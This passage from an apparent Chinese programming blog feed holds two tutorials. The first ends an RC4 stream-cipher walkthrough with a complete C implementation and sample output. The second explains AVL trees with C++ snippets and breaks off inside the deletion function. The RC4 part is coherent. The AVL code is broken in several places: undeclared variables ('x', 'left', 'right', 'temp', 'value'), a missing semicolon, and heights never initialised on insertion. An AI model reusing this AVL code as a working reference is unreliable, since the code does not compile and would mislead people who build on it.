class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用S盒生成密钥流——The-pseudo-random-generation-algorithm-PRGA"><a href="#利用S盒生成密钥流——The-pseudo-random-generation-algorithm-PRGA" class="headerlink" title="利用S盒生成密钥流——The pseudo-random generation algorithm(PRGA)"></a>利用S盒生成密钥流——The pseudo-random generation algorithm(PRGA)</h3><p><img src="/.io//1344097-20210115114116132-568699983.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 生成密钥流 Keystream */</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    j = (j + puc_sbox[i]) % <span class="number">256</span>;</span><br><span class="line">    swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">    t = (puc_sbox[i] + puc_sbox[j]) % <span class="number">256</span>;</span><br><span class="line">    puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBOX_LEN 256</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_encrypt rc4_crypt</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rc4_decrypt rc4_crypt</span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">swap_uchar</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_x, <span class="type">unsigned</span> <span class="type">char</span> *puc_y)</span></span><br><span class="line">&#123;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_y = *puc_x ^ *puc_y;</span><br><span class="line">    *puc_x = *puc_x ^ *puc_y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, puc_data[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用Key生成S盒</span></span><br><span class="line"><span class="comment"> * the Key-Scheduling Algorithm</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_ksa</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key, <span class="type">int</span> key_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> tmp[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        puc_sbox[i] = i;</span><br><span class="line">        tmp[i] = puc_key[i % key_length];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SBOX_LEN; i++) &#123;</span><br><span class="line">        j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); <span class="comment">//交换puc_sbox[i]和puc_sbox[j]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 利用S盒生成密钥流</span></span><br><span class="line"><span class="comment"> * The pseudo-random generation algorithm(PRGA)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">rc4_prga</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_sbox, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; ul_data_length; k++) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % SBOX_LEN;</span><br><span class="line">        j = (j + puc_sbox[i]) % SBOX_LEN;</span><br><span class="line">        swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]);</span><br><span class="line">        t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN;</span><br><span class="line">        <span class="comment">/* 为了更清晰理解rc4算法流程，此处保存keystream，不直接进行XOR运算 */</span></span><br><span class="line">        puc_key_stream[k] = puc_sbox[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 加解密 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *puc_data, <span class="type">unsigned</span> <span class="type">char</span> *puc_key_stream, <span class="type">unsigned</span> <span class="type">long</span> ul_data_length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 把PRGA算法放在加解密函数中可以不需要保存keystream */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ul_data_length; i++) &#123;</span><br><span class="line">        puc_data[i] ^= puc_key_stream[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sbox[SBOX_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> key[SBOX_LEN] = &#123;<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>&#125;; <span class="comment">//秘钥内容随便定义</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">512</span>] = <span class="string">&quot;lsRJ@.0 lvfvr#9527&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> puc_keystream[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ul_data_length = <span class="built_in">strlen</span>(data);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s, length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data string:%s\n&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Raw data hex:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成S-box */</span></span><br><span class="line">    rc4_ksa(sbox, (<span class="type">unsigned</span> <span class="type">char</span> *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 生成keystream并保存,S-box也会被更改 */</span></span><br><span class="line">    rc4_prga(sbox, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S-box final status:\n&quot;</span>);</span><br><span class="line">    hexdump(sbox, <span class="keyword">sizeof</span>(sbox));</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key stream:\n&quot;</span>);</span><br><span class="line">    hexdump(puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 加密 */</span></span><br><span class="line">    rc4_encrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cipher hexdump:\n&quot;</span>);</span><br><span class="line">    hexdump(data, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* 解密 */</span></span><br><span class="line">    rc4_decrypt((<span class="type">unsigned</span> <span class="type">char</span>*)data, puc_keystream, ul_data_length);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;decypt data:%s\n&quot;</span>, data);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(shelmean㉿ubuntu)-[~/rc4]</span><br><span class="line">└─$ ./rc4</span><br><span class="line">key=abcdefghijklmnopqrstuvwxyz, length=26</span><br><span class="line"> </span><br><span class="line">Raw data string:lsRJ@.0 lvfvr#9527</span><br><span class="line">Raw data hex:</span><br><span class="line">6C73524A402E30206C76667672233935</span><br><span class="line">3237</span><br><span class="line">S-box final status:</span><br><span class="line">0F6F831DDB7F1C9C918760EB3B2FF7B3</span><br><span class="line">3F49485A942603DEA95F463386711A55</span><br><span class="line">DC6DF03D05975EAA41D94E2DAF135059</span><br><span class="line">09ED42C69847067BCCB75BD7747D0C4D</span><br><span class="line">2B0E844F9A516853527311354C77219E</span><br><span class="line">FD179F02297C18A06A7572BF2CC5A108</span><br><span class="line">E1F8E7A819C0DFA28DFF8FD262D4BAAD</span><br><span class="line">6E3CA34476340B048CA580E5F4B42A20</span><br><span class="line">2232FA153090EECB9B56A600EFB2A7A4</span><br><span class="line">2EF5C1E3AEF93882B0B6B87E376C668E</span><br><span class="line">541F7925144585C8C4963AC9B5B1248A</span><br><span class="line">E4F11E16B9E289E8CD3EEC23D19D694A</span><br><span class="line">BDC28BFED0FCABCA7057F30DEAE901C7</span><br><span class="line">ACE067BB27BE9293E66139F25D120ABC</span><br><span class="line">2831CED3FBD55CCF9995436436C3D681</span><br><span class="line">58DA65DD1B781063D807F66B404B887A</span><br><span class="line"> </span><br><span class="line">key stream:</span><br><span class="line">2393B785D3C35D48248588D0C0159423</span><br><span class="line">1EEA</span><br><span class="line">cipher hexdump:</span><br><span class="line">4FE0E5CF93ED6D6848F3EEA6B236AD16</span><br><span class="line">2CDD</span><br><span class="line">decypt data:lsRJ@.0 lvfvr#9527</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AvlTree</title>
      <link href="/2023/04/01/AvlTree/"/>
      <url>/2023/04/01/AvlTree/</url>
      
        <content type="html"><![CDATA[<h1 id="AvlTree"><a href="#AvlTree" class="headerlink" title="AvlTree"></a>AvlTree</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>AVL 树是一种平衡二叉树，得名于其发明者的名字（ Adelson-Velskii 以及 Landis）。（可见名字长的好处，命名都能多占一个字母出来）。平衡二叉树递归定义如下：</p><ol><li>左右子树的高度差小于等于 1。</li><li>其每一个子树均为平衡二叉树。</li></ol><p><strong>平衡因子</strong>： 某个结点的左子树的高度减去右子树的高度得到的差值。</p><p>AVL 树： 所有结点的平衡因子的绝对值都不超过 1 的二叉树。</p><p>为了计算平衡因子，我们自然需要在节点中引入高度这一属性。在这里，我们把节点的高度定义为其左右子树的高度的最大值。因此，引入了高度属性的 AVL 树的节点定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span>             data;</span><br><span class="line">    <span class="type">int</span>             height;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>     *left;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>     *right;</span><br><span class="line">&#125;<span class="type">node_t</span>, * <span class="type">nodeptr_t</span>;</span><br></pre></td></tr></table></figure><p>计算某一个节点的高度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">treeHeight</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(root-&gt;left),<span class="built_in">treeHeight</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在进行如下操作时需要更新受影响的所有节点的高度：</p><ol><li>在插入结点时， 沿插入的路径更新结点的高度值</li><li>在删除结点时（delete）,沿删除的路径更新结点的高度值</li></ol><p>有了高度，计算平衡因子的操作就得以很简单的实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">treeGetBalanceFactor</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> x-&gt;left-&gt;height - x-&gt;right-&gt;height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当平衡因子的绝对值大于 1 时，就会触发树的修正，或者说是再平衡操作。</p><h2 id="树的平衡化操作"><a href="#树的平衡化操作" class="headerlink" title="树的平衡化操作"></a>树的平衡化操作</h2><p>二叉树的平衡化有两大基础操作： 左旋和右旋。左旋，即是逆时针旋转；右旋，即是顺时针旋转。这种旋转在整个平衡化过程中可能进行一次或多次，这两种操作都是从失去平衡的最小子树根结点开始的(即离插入结点最近且平衡因子超过1的祖结点)。</p><h3 id="右旋"><a href="#右旋" class="headerlink" title="右旋"></a>右旋</h3><p><img src="/.io//v2-eee97a3e3e45d8cb6668841f6b44191a_1440w.webp" alt="img"></p><p>所谓右旋操作，就是把上图中的 B 节点和 C 节点进行所谓“父子交换”。在仅有这三个节点时候，是十分简单的。但是当 B 节点处存在右孩子时，事情就变得有点复杂了。我们通常的操作是：<strong>抛弃右孩子，将之和旋转后的节点 C 相连，成为节点 C 的左孩子</strong>。这样，我们就能写出对应的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">nodeptr_t</span> <span class="title">treeRotateRight</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> left = root-&gt;left;</span><br><span class="line">    </span><br><span class="line">    root-&gt;left = left-&gt;right; <span class="comment">// 将将要被抛弃的节点连接为旋转后的 root 的左孩子</span></span><br><span class="line">    left-&gt;right = root; <span class="comment">// 调换父子关系</span></span><br><span class="line"></span><br><span class="line">    left-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(left-&gt;left), <span class="built_in">treeHeight</span>(left-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    right-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(right-&gt;left), <span class="built_in">treeHeight</span>(right-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="左旋"><a href="#左旋" class="headerlink" title="左旋"></a>左旋</h3><p><img src="/.io//v2-0a737f5850ac96deec1821c80391a08a_1440w.webp" alt="img"></p><p>左旋操作和右旋操作十分类似</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">nodeptr_t</span> <span class="title">treeRotateLeft</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> right = root-&gt;right;</span><br><span class="line"></span><br><span class="line">    root-&gt;right = right-&gt;left;</span><br><span class="line">    right-&gt;left = root;</span><br><span class="line"></span><br><span class="line">    left-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(left-&gt;left), <span class="built_in">treeHeight</span>(left-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    right-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(right-&gt;left), <span class="built_in">treeHeight</span>(right-&gt;right))+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="需要平衡的四种情况"><a href="#需要平衡的四种情况" class="headerlink" title="需要平衡的四种情况"></a>需要平衡的四种情况</h2><h3 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h3><p><img src="/.io//v2-58c02894bce9e580481c075efc35f226_1440w.webp" alt="img"></p><h3 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h3><p><img src="/.io//v2-58c02894bce9e580481c075efc35f226_1440w.webp" alt="img"></p><p>LR</p><p><img src="/.io//v2-acc2de5f4d30d41a6b39b0c5a9b2dbbe_1440w.webp" alt="img"></p><h3 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h3><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>平衡化操作的实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">nodeptr_t</span> <span class="title">treeRebalance</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> factor = <span class="built_in">treeGetBalanceFactor</span>(root);</span><br><span class="line">    <span class="keyword">if</span>(factor &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;left) &gt; <span class="number">0</span>) <span class="comment">// LL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateRight</span>(root);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(factor &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;left) &lt;= <span class="number">0</span>) &#123; <span class="comment">//LR</span></span><br><span class="line">        root-&gt;left = <span class="built_in">treeRotateLeft</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateRight</span>(temp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(factor &lt; <span class="number">-1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;right) &lt;= <span class="number">0</span>) <span class="comment">// RR</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateLeft</span>(root);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((factor &lt; <span class="number">-1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;right) &gt; <span class="number">0</span>) &#123; <span class="comment">// RL</span></span><br><span class="line">        root-&gt;right = <span class="built_in">treeRotateRight</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateLeft</span>(root);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// Nothing happened.</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">treeInsert</span><span class="params">(<span class="type">nodeptr_t</span> *rootptr, <span class="type">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> newNode;</span><br><span class="line">    <span class="type">nodeptr_t</span> root = *rootptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        newNode = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">node_t</span>));</span><br><span class="line">        <span class="built_in">assert</span>(newNode);</span><br><span class="line"></span><br><span class="line">        newNode-&gt;data = value;</span><br><span class="line">        newNode-&gt;left = newNode-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        *rootptr = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;data == value) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data &lt; value)</span><br><span class="line">            <span class="built_in">treeInsert</span>(&amp;root-&gt;right,value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">treeInsert</span>(&amp;root-&gt;left,value)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">treeRebalance</span>(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">treeDelete</span><span class="params">(<span class="type">nodeptr_t</span> *rootptr, <span class="type">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> *toFree; <span class="comment">// 拜拜了您呐</span></span><br><span class="line">    <span class="type">nodeptr_t</span> root = *rootptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data == value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;right) &#123;</span><br><span 